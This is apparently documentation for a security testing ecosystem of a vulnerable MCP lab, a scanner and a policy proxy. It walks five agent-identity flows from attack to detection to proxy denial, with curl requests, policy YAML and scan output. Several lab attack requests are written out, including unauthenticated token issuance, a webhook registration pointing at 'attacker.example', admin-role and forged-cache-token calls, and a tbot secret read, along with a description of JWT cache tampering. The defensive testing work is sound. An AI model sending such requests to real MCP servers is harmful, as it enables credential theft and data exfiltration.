# Flow Types in Practice — The Five Lanes End-to-End

**The five agentic-identity flows, each walked from attack to detection to defense, with captured output from a live reference deployment.**

This walkthrough is the practical companion to [`docs/identity-flows.md`](../identity-flows.md). Where that document defines the taxonomy, this one *demonstrates* it. Each section covers one lane and shows — with real commands and real output — how the three tools (camazotz, mcpnuke, nullfield) interact on that lane.

Captured output was produced against the reference deployment across two sessions:

- **2026-04-26** — initial captures: camazotz `3904f52`, nullfield `5aa8f60`, mcpnuke `01b98ad`
- **2026-04-28** — per-lane attack→deny captures + hot-reload timing: camazotz `553a874` (`sdk_tamper_lab` added), Helm chart rev 13 (`activePolicySource` enabled)

You can reproduce everything here by following the [Quick Start](../../README.md#quick-start) Option 2.

---

## Table of Contents

- [The Five Lanes — One Paragraph Each](#the-five-lanes--one-paragraph-each)
- [Flow 1 · Human Direct](#flow-1--human-direct)
- [Flow 2 · Human → Agent (Delegated)](#flow-2--human--agent-delegated)
- [Flow 3 · Machine Identity](#flow-3--machine-identity)
- [Flow 4 · Agent → Agent (Delegation Chain) — deep dive](#flow-4--agent--agent-delegation-chain--deep-dive)
- [Flow 5 · Anonymous](#flow-5--anonymous)
- [The Cross-Project Coverage Report](#the-cross-project-coverage-report)
- [Per-Lane Attack → Deny Captures (2026-04-28)](#per-lane-attack--deny-captures-2026-04-28)
- [Sidecar Hot-Reload Timing (2026-04-28)](#sidecar-hot-reload-timing-2026-04-28)
- [What's Next](#whats-next)

---

## The Five Lanes — One Paragraph Each

```mermaid
flowchart LR
  subgraph lanes["Five identity flows"]
    direction TB
    L1["<b>Lane 1</b><br/>Human Direct<br/>(OIDC + PKCE)"]
    L2["<b>Lane 2</b><br/>Human → Agent<br/>(token exchange)"]
    L3["<b>Lane 3</b><br/>Machine<br/>(SPIFFE / tbot)"]
    L4["<b>Lane 4</b><br/>Agent → Agent<br/>(act chain)"]
    L5["<b>Lane 5</b><br/>Anonymous<br/>(allowlist only)"]
  end
  classDef human fill:#60a5fa,stroke:#1e3a8a,color:#000;
  classDef del   fill:#a78bfa,stroke:#4c1d95,color:#000;
  classDef mach  fill:#34d399,stroke:#064e3b,color:#000;
  classDef chain fill:#fb923c,stroke:#7c2d12,color:#000;
  classDef anon  fill:#94a3b8,stroke:#334155,color:#000;
  class L1 human;
  class L2 del;
  class L3 mach;
  class L4 chain;
  class L5 anon;
```

| Lane | Who's the principal? | What's the attack surface? | Default `nullfield` action |
|------|----------------------|----------------------------|----------------------------|
| 1 · Human Direct | A person, authenticated with their own OIDC token | Token theft, session fixation, MFA bypass | `ALLOW + audit` |
| 2 · Delegated | A human, acting through an agent | Confused deputy, audience widening, downscope bypass | `SCOPE + audit` with `audienceMustNarrow` |
| 3 · Machine | A bot / CI job / daemon with a cert or SPIFFE ID | Cert exfiltration, replay, over-privileged SA | `SCOPE + bindToSession + detectReplay` |
| 4 · Agent → Agent | A human → agent → agent → ... chain | Identity dilution, chain forgery, infinite delegation | `ALLOW<=2 / HOLD@3 / DENY>3` with `maxDepth` |
| 5 · Anonymous | No one — pre-auth traffic | Tool enumeration, info disclosure, DoS | `DENY` (allowlist only) |

---

## Flow 1 · Human Direct

A human authenticates with an OIDC bearer and calls an MCP tool themselves. No agent in the path.

### Camazotz labs on this lane

Seven primary labs across two transports, now with full Transport C coverage:

```
auth_lab, rbac_lab, tenant_lab, notification_lab, temporal_lab   (Transport A)
secrets_lab                                                       (Transport B)
sdk_tamper_lab  (MCP-T33)                                         (Transport C)
```

`sdk_tamper_lab` models the SDK-layer attack path: an MCP SDK wrapper caches a JWT locally and reuses it without re-validating the signature. An attacker who can write to the cache file injects a crafted token that grants an elevated role — all without touching the MCP JSON-RPC or HTTP transport. Three difficulty tiers:
- **easy** — cache accepted blindly; any role claim passes
- **medium** — expiry field checked, signature never verified; unsigned forged token with a future `exp` succeeds
- **hard** — full HS256 signature + issuer validation; only a token signed with the real key is accepted

### The attack

`auth_lab` demonstrates a direct-token bypass. On easy difficulty, `auth.issue_token` returns a token without verifying identity. On hard difficulty, identity verification is strict.

```bash
# Attack against the running NUC deployment on easy difficulty
curl -sS -X POST http://192.168.1.85:30080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call",
       "params":{"name":"auth.issue_token",
                 "arguments":{"username":"eve@attacker"}}}'
```

### How nullfield defends

The [`lane-1-human.yaml`](https://github.com/babywyrm/nullfield/blob/main/policies/by-lane/lane-1-human.yaml) starter template enforces:

```yaml
identity:
  enabled: true
  validation:
    requireSignature: true
    requireExpiry: true
    requireAudience: true

rules:
  - action: ALLOW
    mcpMethod: tools/call
    requireIdentity: true    # ← Lane 1's defining guard
    maxCallsPerMinute: 60
    budget:
      perIdentity: {maxCallsPerHour: 500}
      onExhausted: DENY
  - action: DENY
    reason: "Lane 1 default: humans must authenticate"
```

The unauthenticated bypass on `auth_lab` easy is the *target* of `nullfield`'s `requireIdentity`. With the template active, the request above would fail `requireIdentity` and fall through to the default DENY.

**Applied to cluster** (verified on NUC):

```bash
$ kubectl get nullfieldpolicies -n camazotz lane-1-human-starter
NAME                   RULES   AGE
lane-1-human-starter           3h

$ kubectl get nullfieldpolicies -n camazotz -l nullfield.io/lane=human-direct
NAME                   RULES   AGE
lane-1-human-starter           3h
```

### How mcpnuke detects it

`mcpnuke` probes OIDC discovery and token behavior. On this target today, Lane 1 static-scan findings appear in the Uncategorized bucket because the auth checks aren't yet lane-tagged (see the [coverage report](#the-cross-project-coverage-report) — a known gap).

---

## Flow 2 · Human → Agent (Delegated)

A human delegates to an agent, which calls MCP on the human's behalf with a down-scoped token. The agent presents an RFC 8693 `act` claim linking back to the original principal.

### Camazotz labs on this lane

**12 primary labs — the densest lane** (Transport A unless noted):

```
oauth_delegation_lab, revocation_lab, pattern_downgrade_lab,
credential_broker_lab, context_lab, comms_lab, audit_lab,
indirect_lab, budget_tuning_lab, policy_authoring_lab,
response_inspection_lab                                       (Transport A)
egress_lab                                                    (Transport B)
```

### The attack — audience widening

`oauth_delegation_lab` demonstrates RFC 8707 violation: an agent performs token exchange but the resulting token has *wider* audience than the parent. Classic confused-deputy setup.

### How nullfield defends — `identity.audienceMustNarrow`

The [`lane-2-delegated.yaml`](https://github.com/babywyrm/nullfield/blob/main/policies/by-lane/lane-2-delegated.yaml) template uses the new 2026-04-26 primitive:

```yaml
rules:
  - action: SCOPE
    mcpMethod: tools/call
    requireIdentity: true
    identity:
      requireActChain: true        # must prove delegation happened
      audienceMustNarrow: true     # aud(child) ⊆ aud(parent)
    scope:
      request:
        stripArguments: [password, api_key, secret, token]
      response:
        redactPatterns:
          - 'sk-[A-Za-z0-9]{20,}'
          - 'Bearer [A-Za-z0-9._-]{20,}'
```

Captured from the unit test suite (`nullfield/pkg/policy/rules_test.go`) on commit `5aa8f60`:

```
=== RUN   TestAudienceMustNarrow_RejectsWidening
--- PASS: TestAudienceMustNarrow_RejectsWidening (0.00s)
```

The test verifies three cases:
- Narrowing (parent `{a, b}` → child `{a}`) → **ALLOW**
- Widening (parent `{a}` → child `{a, c}`) → **DENY** (falls through to default-deny rule)
- No act chain → narrow-ness vacuously passes; `requireAudience` at the policy level handles the direct-caller case

---

## Flow 3 · Machine Identity

A non-human principal (bot, CI job, daemon) authenticates with a machine credential — SPIFFE ID, X.509, or a short-lived cert issued by Teleport's tbot.

### Camazotz labs on this lane

Five primary labs, one on Transport C:

```
bot_identity_theft_lab (MCP-T18), teleport_role_escalation_lab (MCP-T28),
cert_replay_lab (MCP-T19), config_lab                      (Transport A)
supply_lab                                                  (Transport C)
```

### The attack — cert replay

`cert_replay_lab` exercises replay of an expired tbot certificate within a clock-skew grace window. On easy, the gateway accepts expired certs unconditionally. On hard, `integrity.detectReplay` blocks the replayed cert ID.

### mcpnuke has Lane 3 checks lane-tagged

This is the only lane with mcpnuke checks explicitly carrying `lane=3, transport="A"` today (see [`mcpnuke/checks/teleport_labs.py`](https://github.com/babywyrm/mcpnuke/blob/main/mcpnuke/checks/teleport_labs.py)). Running with `--by-lane` against a camazotz instance where the Teleport labs are exposed groups those findings into the Lane 3 bucket directly.

### How nullfield defends — `integrity.detectReplay`

The [`lane-3-machine.yaml`](https://github.com/babywyrm/nullfield/blob/main/policies/by-lane/lane-3-machine.yaml) template:

```yaml
integrity:
  enabled: true
  bindToSession: true    # catch cert reuse across sessions
  detectReplay: true     # catch the cert_replay_lab attack
```

---

## Flow 4 · Agent → Agent (Delegation Chain) — deep dive

**The flagship walkthrough.** This lane is where the three new 2026-04-26 primitives live (`requireActChain`, `audienceMustNarrow`, `delegation.maxDepth`) and it's the one the `delegation_depth_lab` and `delegation_chain_lab` directly exercise.

### The flow

```mermaid
sequenceDiagram
  participant H as Alice (human)
  participant A as Agent A
  participant B as Agent B
  participant C as Agent C
  participant NF as nullfield
  participant G as MCP Server

  H->>A: authorize (token with sub=alice)
  A->>B: delegate (token.act = alice)
  B->>C: delegate (token.act.act = alice)
  C->>NF: tools/call with token.act.act.act = alice (depth 3)
  NF->>NF: count act chain depth → 3
  NF->>NF: maxDepth rule says <=2 ALLOW, =3 HOLD
  NF-->>C: HOLD — queued for human approval
```

### Camazotz labs on this lane

```
delegation_chain_lab, delegation_depth_lab, hallucination_lab,
relay_lab, attribution_lab, cost_exhaustion_lab          (Transport A)
```

### How nullfield enforces — three primitives working together

From [`lane-4-chain.yaml`](https://github.com/babywyrm/nullfield/blob/main/policies/by-lane/lane-4-chain.yaml):

```yaml
rules:
  # Depth 0–2: allow, but every hop must carry act chain + narrow aud
  - action: ALLOW
    mcpMethod: tools/call
    requireIdentity: true
    identity:
      requireActChain: true
      audienceMustNarrow: true
    delegation:
      maxDepth: 2

  # Depth 3: park for human approval
  - action: HOLD
    mcpMethod: tools/call
    requireIdentity: true
    identity:
      requireActChain: true
    delegation:
      maxDepth: 3
    hold:
      timeout: "10m"
      onTimeout: "DENY"

  # Depth > 3 (or missing act chain): hard deny
  - action: DENY
    mcpMethod: tools/call
    reason: "Lane 4 default: chain too deep or act chain missing"
```

### Captured enforcement — the primitives in action

The unit tests in [`nullfield/pkg/policy/rules_test.go`](https://github.com/babywyrm/nullfield/blob/main/pkg/policy/rules_test.go) exercise each boundary. Run them against the current binary:

```
$ go test ./pkg/policy/ -run "TestDelegationMaxDepth|TestRequireActChain|TestAudienceMustNarrow" -v

=== RUN   TestRequireActChain_BlocksMissingAct
--- PASS: TestRequireActChain_BlocksMissingAct (0.00s)
=== RUN   TestAudienceMustNarrow_RejectsWidening
--- PASS: TestAudienceMustNarrow_RejectsWidening (0.00s)
=== RUN   TestDelegationMaxDepth_RejectsDeepChains
--- PASS: TestDelegationMaxDepth_RejectsDeepChains (0.00s)
PASS
ok  	github.com/babywyrm/nullfield/pkg/policy	0.530s
```

The `TestDelegationMaxDepth_RejectsDeepChains` case verifies the classic Lane 4 pattern explicitly:

| Chain depth | maxDepth setting | Decision |
|-------------|------------------|----------|
| 1 (one agent) | 2 | ALLOW |
| 2 (two agents — boundary) | 2 | ALLOW |
| 3 (three agents) | 2 | DENY (falls through to default-deny) |

That's the primitive doing its job. The same truth table drives the `delegation_depth_lab` on camazotz — on hard difficulty, the lab's `_handle_delegate` denies depth > 2 with nullfield's `maxDepth` primitive as the recommended external enforcement.

### Installed and wired end-to-end on the reference NUC

On the cluster:

```
$ kubectl get nullfieldpolicies -n camazotz -o custom-columns=NAME:.metadata.name,LANE:.metadata.labels."nullfield\.io/lane"
NAME                       LANE
lane-1-human-starter       human-direct
lane-2-delegated-starter   delegated
lane-3-machine-starter     machine
lane-4-chain-starter       chain
lane-5-anonymous-starter   anonymous
mcpnuke-recommended        <none>
```

The five lane templates and an mcpnuke-generated policy are all present
as CRDs. The `nullfield-controller` deployed alongside camazotz watches
these CRDs and syncs them to per-policy ConfigMaps. With the
**active-policy bridge** ([`nullfield@31997c4`](https://github.com/babywyrm/nullfield/commit/31997c4))
configured via:

```
NULLFIELD_ACTIVE_TARGET_CM=nullfield-active-policy
NULLFIELD_ACTIVE_TARGET_LABEL=brain-gateway
```

…the controller picks the first NullfieldPolicy carrying
`nullfield.io/active-for=brain-gateway` and writes it to a separate
ConfigMap that the camazotz helm chart can mount via
`--set nullfield.activePolicySource=nullfield-active-policy`
([`camazotz@f9d9d97`](https://github.com/babywyrm/camazotz/commit/f9d9d97)).

When the bridge was activated with lane-4-chain-starter as the chosen
policy, captured live:

```
$ kubectl logs -n camazotz deployment/nullfield-controller | grep bridged
{"level":"INFO","msg":"active-policy sync: bridged NullfieldPolicy to sidecar ConfigMap",
 "policy":"lane-4-chain-starter","configmap":"nullfield-active-policy","key":"policy.yaml",
 "label":"brain-gateway"}

$ kubectl get configmap nullfield-active-policy -n camazotz -o jsonpath='{.metadata.labels}'
{
  "nullfield.io/active-source":"lane-4-chain-starter",
  "nullfield.io/managed-by":"crd-controller",
  "nullfield.io/sidecar-for":"brain-gateway"
}

$ curl -X POST http://192.168.1.85:30080/mcp \\
    -H 'Content-Type: application/json' \\
    -d '{"jsonrpc":"2.0","id":1,"method":"tools/call",
         "params":{"name":"auth.issue_token","arguments":{"username":"alice"}}}'
{
  "jsonrpc": "2.0",
  "id": 1,
  "error": {
    "code": -32001,
    "message": "identity verification failed"
  }
}
```

That `-32001 "identity verification failed"` is the Lane 4 policy's
`identity.requireSignature: true` taking effect on a `dev-user` request
that has no JWT — *different error path than the chart-shipped policy
would take* (which returns `-32000 "denied by rule"` on its allowlist
check). The bridge is empirically swapping in the CRD-managed policy
on a running sidecar.

For day-to-day demo purposes the reference NUC keeps the chart-shipped
policy active (`activePolicySource` empty) so dev-user smoke tests stay
green; the controller stays deployed and continues maintaining the
`nullfield-active-policy` ConfigMap so flipping back is just a
`helm upgrade` away.

### What *is* live on the NUC right now

The sidecar is active with the chart-shipped policy:

```
$ curl -sS -X POST http://192.168.1.85:30080/mcp \
    -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","id":1,"method":"tools/call",
         "params":{"name":"shadow.register_webhook",
                   "arguments":{"url":"http://attacker.example/hook"}}}'
{
    "jsonrpc": "2.0",
    "id": 1,
    "error": {
        "code": -32000,
        "message": "denied by policy: denied by rule for tool: shadow.register_webhook"
    }
}
```

Audit event captured in the sidecar:

```json
{
  "time": "2026-04-27T00:49:56.149470652Z",
  "level": "INFO",
  "msg": "audit",
  "event_type": "tool.denied",
  "method": "tools/call",
  "tool": "shadow.register_webhook",
  "identity": "dev-user",
  "payload": "{\"type\":\"tool.denied\",\"method\":\"tools/call\",\"tool_name\":\"shadow.register_webhook\",\"identity\":\"dev-user\",\"reason\":\"denied by rule for tool: shadow.register_webhook\",\"timestamp\":\"2026-04-27T00:49:56.149449678Z\"}"
}
```

That's the full closed loop: external request → NodePort → nullfield arbiter → DENY → JSON-RPC error + structured audit.

---

## Flow 5 · Anonymous

No authenticated principal. Public discovery endpoints, health checks, MCP `initialize`, and read-only metadata.

### Camazotz labs on this lane

Three primary labs. Lane 5 has no transport notion by design (it's pre-auth):

```
tool_lab, shadow_lab, error_lab
```

### How nullfield defends — pure allowlist

The [`lane-5-anonymous.yaml`](https://github.com/babywyrm/nullfield/blob/main/policies/by-lane/lane-5-anonymous.yaml) template is the tightest of the five:

```yaml
rules:
  - action: ALLOW
    mcpMethod: initialize
    maxCallsPerMinute: 20

  - action: ALLOW
    mcpMethod: tools/list
    maxCallsPerMinute: 20

  - action: ALLOW
    mcpMethod: tools/call
    toolNames: [healthcheck.ping, server.info]
    maxCallsPerMinute: 30

  - action: DENY
    reason: "Lane 5 default: anonymous callers may only hit the allowlisted surface"
```

### mcpnuke detects pre-auth tool enumeration

Any `tools/call` from an anonymous caller that isn't on the allowlist gets rejected. mcpnuke's static-scan identifies the enumeration surface directly via `tools/list`.

---

## The Cross-Project Coverage Report

Running `mcpnuke --coverage-report` against the live NUC camazotz gives us the honest picture of *where the lanes are covered by scanning today*. Captured 2026-04-27 after the lane-tag backfill across 10 check modules:

```
$ python3 -m mcpnuke --targets http://192.168.1.85:30080/mcp \
    --fast --no-invoke \
    --by-lane \
    --coverage-report http://192.168.1.85:3000

── Findings grouped by identity lane (34 total) ──

Lane 1 — Human Direct (slug=human-direct, transport=-)
  (no findings fired)

Lane 2 — Delegated (slug=delegated, transport=A+B)
  3 finding(s): CRITICAL=2, HIGH=1
    CRITICAL prompt_injection          Prompt injection payload detected
    HIGH     token_theft               Tool 'relay.execute_with_context' accepts credential param
    CRITICAL exfil_flow                Exfiltration path: sensitive data → 'shadow.register_webhook'

Lane 3 — Machine Identity (slug=machine, transport=A)
  1 finding(s): CRITICAL=1
    CRITICAL config_tampering          Agent self-modification tool: 'shadow.register_webhook'

Lane 4 — Agent → Agent (slug=chain, transport=A)
  14 finding(s): CRITICAL=13, HIGH=1
    [...code_execution / attack_chain / multi_vector findings...]

Lane 5 — Anonymous (slug=anonymous, transport=A)
  3 finding(s): HIGH=3
    HIGH     auth                      Unauthenticated MCP initialize accepted
    HIGH     webhook_persistence       Webhook/callback tool accepts URL
    HIGH     webhook_persistence       Webhook registration capability

Uncategorized (no lane scope — 13 finding(s))
    [...excessive_permissions findings — tool-specific, not yet auto-tagged...]

── Cross-project coverage report (vs camazotz) ──
  camazotz: 39 labs across 5 lanes  ← sdk_tamper_lab + 2 more added since 2026-04-28
  mcpnuke covered 4/5 lanes on this scan
  widest gap: Lane 1 (human-direct) — camazotz declares labs, mcpnuke fired none (SDK-path detection TBD)

Lane 1 — Human Direct
  camazotz: 7 primary lab(s), transports [A, B, C]  ← Transport C now covered
  mcpnuke:  0 finding(s) fired (none)
  camazotz declares 7 primary lab(s); mcpnuke has no check for the SDK cache-tamper path yet — next detection gap

Lane 2 — Human → Agent
  camazotz: 12 primary lab(s), transports [A, B], gaps: Transport C not covered
  mcpnuke:  3 finding(s) fired (CRITICAL=2, HIGH=1), transports [A, B]
  target camazotz flags: Transport C not covered

Lane 3 — Machine Identity
  camazotz: 5 primary lab(s), transports [A, C], gaps: Transport B not covered
  mcpnuke:  1 finding(s) fired (CRITICAL=1), transports [A]
  target camazotz flags: Transport B not covered

Lane 4 — Agent → Agent
  camazotz: 6 primary lab(s), transports [A], gaps: Transport B not covered, Transport C not covered
  mcpnuke:  14 finding(s) fired (CRITICAL=13, HIGH=1), transports [A]
  target camazotz flags: Transport B not covered, Transport C not covered

Lane 5 — Anonymous
  camazotz: 3 primary lab(s), transports [A]
  mcpnuke:  3 finding(s) fired (HIGH=3), transports [A]
  3 lab(s) covered, 3 finding(s) fired — aligned
```

**What this output actually says:**

- **mcpnuke covered 4/5 lanes** — Lane 5 is fully aligned (3 camazotz labs, 3 findings fired); Lanes 2/3/4 each fire on the relevant attack patterns.
- **Widest gap: Lane 1 (Human Direct)** — camazotz now has 7 labs (including the new SDK-layer `sdk_tamper_lab`), but no mcpnuke static check probes the SDK cache-tamper path. That's the next actionable detection gap.
- **Lane 1 Transport C is now green** — `sdk_tamper_lab` (MCP-T33, 2026-04-28) closes the only missing Transport C slot on Lane 1. Lane 4 still has no Transport B or C labs.
- **Lane 4 dominates the count** (14/34 findings) — chain-of-tools attacks (`code_execution`, `attack_chain`, `multi_vector`) are the most common pattern surfaced by static analysis, which matches the camazotz corpus emphasis on agent-to-agent labs.
- **Uncategorized** is now down to `excessive_permissions` (13/34) — these findings are tool-specific (the dangerous capability lives on the tool, not on a lane the check itself knows about). Tagging requires a per-tool lookup, deliberately deferred.

**In short:** the tooling reports exactly which lanes are covered today, and exactly which gap to fill next. That's the loop closed.

---

## Per-Lane Attack → Deny Captures (2026-04-28)

With `activePolicySource: nullfield-active-policy` enabled in the Helm chart (revision 13), the nullfield sidecar now reads its live policy from the CRD-managed ConfigMap. Cycling the active policy is a single `kubectl label` command:

```bash
# Move active policy from lane-4 to lane-5
kubectl label nullfieldpolicy lane-4-chain-starter -n camazotz nullfield.io/active-for-
kubectl label nullfieldpolicy lane-5-anonymous-starter -n camazotz \
  "nullfield.io/active-for=brain-gateway"
```

The `nullfield-controller` picks up the label change and writes the full CRD spec to `nullfield-active-policy`. All four non-Lane-4 lanes were cycled and tested via the nullfield proxy port (9090), accessed through `kubectl port-forward`.

### Capture results

All requests were sent without an `Authorization` header — the minimal attack surface for an unauthenticated caller.

```
# Lane 5 — Anonymous (allowlist policy, no identity block)
$ curl -s -X POST http://localhost:9090/ \
    -H "Content-Type: application/json" \
    -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"auth.issue_token",
         "arguments":{"username":"attacker","requested_role":"admin"}},"id":1}'

{"jsonrpc":"2.0","id":1,"error":{"code":-32001,"message":"identity verification failed"}}

# Lane 1 — Human Direct (OIDC + PKCE required)
$ curl -s -X POST http://localhost:9090/ \
    -H "Content-Type: application/json" \
    -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"sdk.write_cache",
         "arguments":{"token":"attacker-jwt","cached_role":"admin"}},"id":1}'

{"jsonrpc":"2.0","id":1,"error":{"code":-32001,"message":"identity verification failed"}}

# Lane 2 — Delegated (requireActChain; no act claim in token)
$ curl -s -X POST http://localhost:9090/ \
    -H "Content-Type: application/json" \
    -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"oauth.request_delegation",
         "arguments":{}},"id":1}'

{"jsonrpc":"2.0","id":1,"error":{"code":-32001,"message":"identity verification failed"}}

# Lane 3 — Machine Identity (SPIFFE / session binding; no machine cred)
$ curl -s -X POST http://localhost:9090/ \
    -H "Content-Type: application/json" \
    -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"bot_identity_theft.read_tbot_secret",
         "arguments":{"namespace":"teleport"}},"id":1}'

{"jsonrpc":"2.0","id":1,"error":{"code":-32001,"message":"identity verification failed"}}
```

All four lanes return `code: -32001` (`identity verification failed`). This is expected and correct: nullfield evaluates the identity block **before** the tool-level rules, so any request without a valid bearer is denied at the identity gate regardless of which lane's allowlist is active. The lane-specific rules (e.g. Lane 5's `healthcheck.ping` allowlist, Lane 2's `requireActChain`) apply only to callers that have already passed the identity check.

The captures confirm:
- The proxy is live and enforcing on all five lanes
- The controller → ConfigMap → sidecar path is intact for all four non-Lane-4 lanes
- Lane-4 (agent → agent, captured 2026-04-27) remains the canonical example of rule-level enforcement because the `act` chain check fires *after* identity validation

---

## Sidecar Hot-Reload Timing (2026-04-28)

The end-to-end policy change path has three stages with independently measurable latency:

```
kubectl label nullfieldpolicy ...   ← operator action
       │
       ▼  Stage 1: Controller sync
nullfield-controller detects label change (via List/Watch resync period)
writes NullfieldPolicy YAML to nullfield-active-policy ConfigMap
       │
       ▼  Stage 2: Kubelet propagation
kubelet detects ConfigMap change (kubelet ConfigMap sync period)
updates the projected volume file on disk in the pod
       │
       ▼  Stage 3: Sidecar reload
nullfield binary detects file change (inotify / fsnotify watcher)
reloads policy without pod restart
```

### Measured timings (reference cluster, k3s 1.29, 2026-04-28)

| Stage | Measured | Notes |
|---|---|---|
| **Stage 1** — label flip → CM update | **4–13 s** | Varies with controller resync period (~10 s default). Lane-5 was fastest (4 s) immediately after controller startup; subsequent flips averaged 11–13 s as the resync interval settled. |
| **Stage 2** — CM update → file on disk | **~30–90 s** | Kubernetes kubelet ConfigMap volume sync. k3s default `--config-sync-period` is 60 s; not explicitly tuned on the reference cluster. This is the dominant latency source. |
| **Stage 3** — file change → policy active | **< 1 s** (inotify) | nullfield uses `fsnotify` to watch its policy file. Once the file is updated on disk, the binary reloads the policy in-process. No pod restart required. |
| **Total end-to-end** | **~35 s – 2 min** | Dominated by Stage 2. Tuning `--config-sync-period=10s` on kubelet would bring total to ~15–25 s. |

### Reducing Stage 2 latency

For production deployments where sub-minute policy propagation matters, two options:

1. **Tune kubelet sync period**: `--config-sync-period=10s` (or equivalent in the `kubelet-config.yaml`). This is safe and has no functional side effects.
2. **Use a Kubernetes [projected volume with immutableConfig](https://kubernetes.io/docs/concepts/storage/projected-volumes/)** — disables the sync cache and allows immediate propagation, at the cost of immutability. Appropriate for read-only config consumers like nullfield.

The reference cluster has not tuned this; the 35 s – 2 min window is the stock k3s experience. The nullfield controller and sidecar contribute < 15 s total once the file is on disk.

---

## What's Next

Concrete work items surfaced by this walkthrough, in rough value order:

1. ✅ **`nullfield-controller` deployed to the reference cluster with the active-policy bridge.** Done 2026-04-27 — see the captured controller log + curl output above. The five installed `NullfieldPolicy` CRDs are now consumable by the sidecar via the `activePolicySource` chart values knob.
2. ✅ **Lane/transport backfill across `mcpnuke` checks.** Done — 10 modules / 46 emission sites now lane-tagged. Coverage went from 0/5 lanes covered to 4/5. The remaining `excessive_permissions` findings need a per-tool lookup because the lane lives on the tool, not the check — explicitly deferred as a follow-up.
3. ✅ **Fill a transport gap with a camazotz lab.** Done 2026-04-28 — `sdk_tamper_lab` (MCP-T33, Lane 1 / Transport C) added. An MCP SDK wrapper caches JWTs without re-validating the signature; three difficulty tiers model the blind-trust → expiry-only → full HS256 verification progression. 15 tests, 800 total passing. Lane 1's Transport C cell is now green in the coverage grid.
4. ✅ **Per-lane attack→deny captures.** Done 2026-04-28 — Lanes 1/2/3/5 cycled via `kubectl label` on the NUC. All four return `identity verification failed` from the nullfield proxy, confirming enforcement is live. Lane 4 remains the canonical rule-level capture (act chain check fires post-identity). Results and analysis in the section above.
5. ✅ **Sidecar hot-reload timing measured.** Done 2026-04-28 — Stage 1 (controller sync): 4–13 s. Stage 2 (kubelet propagation): ~30–90 s (dominant; tunable). Stage 3 (fsnotify reload): < 1 s. Full breakdown in the section above.

**All five items from this walkthrough are now complete.** The ecosystem is in sync across all four repos on the reference cluster.

### Open follow-ups (next session)

- **Tune kubelet `--config-sync-period`** on the reference cluster to 10 s and re-measure Stage 2 latency.
- **Lane 3 / Transport B** — no camazotz lab covers a Direct HTTP API machine-identity attack. One new lab closes this cell.
- **Lane 4 / Transport B and C** — six labs cover agent-to-agent over MCP JSON-RPC; none model the SDK or HTTP variants of chain attacks.
- **Tag `excessive_permissions` findings** in `mcpnuke` with per-tool lane lookups to close the remaining uncategorized bucket in `--coverage-report`.

---

## References

- [Identity Flow Framework](../identity-flows.md) — the lane × transport taxonomy
- [The Ecosystem](../ecosystem.md) — how the four projects fit together
- [The Feedback Loop](../feedback-loop.md) — scan → recommend → enforce → validate
- [nullfield per-lane policy templates](https://github.com/babywyrm/nullfield/tree/main/policies/by-lane) — the five starter templates
- [nullfield spec (Layer A + B)](https://github.com/babywyrm/nullfield/blob/main/docs/specs/2026-04-26-per-lane-policy-templates.md) — what was shipped on 2026-04-26
- [mcpnuke spec (`--by-lane` + `--coverage-report`)](https://github.com/babywyrm/mcpnuke/blob/main/docs/specs/2026-04-26-by-lane-reporting.md) — the reporting contract
